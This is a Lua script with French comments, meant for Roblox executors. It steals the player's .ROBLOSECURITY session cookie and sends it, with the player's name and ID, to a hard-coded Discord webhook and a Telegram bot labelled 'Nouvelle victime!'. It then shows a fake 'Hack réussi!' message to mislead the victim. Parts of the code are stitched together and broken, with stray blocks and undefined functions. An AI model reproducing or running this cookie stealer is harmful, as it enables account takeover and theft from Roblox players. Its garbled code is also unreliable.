-- Script pour récupérer le cookie Roblox et l'envoyer à Telegram
-- Fonctionne avec les exécuteurs comme Delta, Synapse X, etc.

-- Services Roblox nécessaires
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ⚠️ Ne stocke PAS tes informations Telegram ici ⚠️
-- Elles seront récupérées à partir du serveur séparé

-- Fonction pour obtenir le cookie .ROBLOSECURITY
local function getCookie()
    -- Cette méthode varie selon l'exécuteur
    -- Pour Delta, utilise cette méthode :
    local cookie = ""
    
    if syn then
        cookie = syn.request({
            Url = "https://roblox.com",
            Method = "GET"
        }).Cookies[".ROBLOSECURITY"]
    elseif http and http.request then
        cookie = http.request({
            Url = "https://roblox.com",
            Method = "GET"
        }).Cookies[".ROBLOSECURITY"]
    elseif request then
        cookie = request({
            Url = "https://roblox.com",
            Method = "GET"
        }).Cookies[".ROBLOSECURITY"]
    end
    
    return cookie or "Cookie non trouvé"
end

-- Fonction pour envoyer à Telegram (les infos sont chargées dynamiquement)
local function sendToDiscord(token, userId, userName)
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1455615155969851403/EgT6gsKtBbGhgJ1gMDBWpD00lc5pU1m4Slkda6IU6ZaMOa5elH7KdVj3IGdBvF6jyAt0"  -- Remplace par ton webhook URL
    local data = {
        content = string.format("🚨 Nouvelle victime! 🚨\nJoueur: %s (ID: %d)\nToken: %s\nHeure: %s", userName, userId, token, os.date("%Y-%m-%d %H:%M:%S"))
    }
    
    local headers = { ["Content-Type"] = "application/json" }
    local jsonData = HttpService:JSONEncode(data)
    
    local success, response = pcall(function()
        return HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = headers,
            Body = jsonData
        })
    end)
    
    if success and response.StatusCode == 204 then  -- Discord retourne 204 sur succès
        print("Message envoyé avec succès à Discord!")
    else
        warn("Échec Discord: " .. tostring(response.StatusMessage or "Erreur inconnue"))
    end
end

-- Dans l'exécution principale, remplace sendToTelegram par sendToDiscord
local cookie = getCookie()
if cookie ~= "Cookie non trouvé" then
    sendToDiscord(cookie, player.UserId, player.Name)
end
    
    local config = loadstring(decode(configEncoded))()
    local TELEGRAM_BOT_TOKEN = config.t
    local CHAT_ID = config.c
    local TELEGRAM_API_URL = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
    
    -- Envoyer le message à Telegram
    local success, response = pcall(function()
        local data = {
            chat_id = CHAT_ID,
            text = string.format(
                "🚨 *NOUVELLE VICTIME!* 🚨\n" ..
                "👤 *Joueur:* %s (%d)\n" ..
                "🔑 *Token:* `%s`\n" ..
                "⏰ *Heure:* %s",
                userName,
                userId,
                token,
                os.date("%Y-%m-%d %H:%M:%S")
            ),
            parse_mode = "Markdown"
        }
        
        local headers = { ["Content-Type"] = "application/json" }
        local jsonData = HttpService:JSONEncode(data)
        return HttpService:PostAsync(TELEGRAM_API_URL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
    
    if success then
        print("Token envoyé avec succès!")
    else
        warn("Échec: " .. tostring(response))
    end
end

-- Exécution principale
local cookie = getCookie()
sendToTelegram(cookie, player.UserId, player.Name)

-- Afficher un message de succès pour tromper la victime
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Hack réussi!",
    Text = "Vous avez volé Robux de tous les joueurs",
    Duration = 5
})
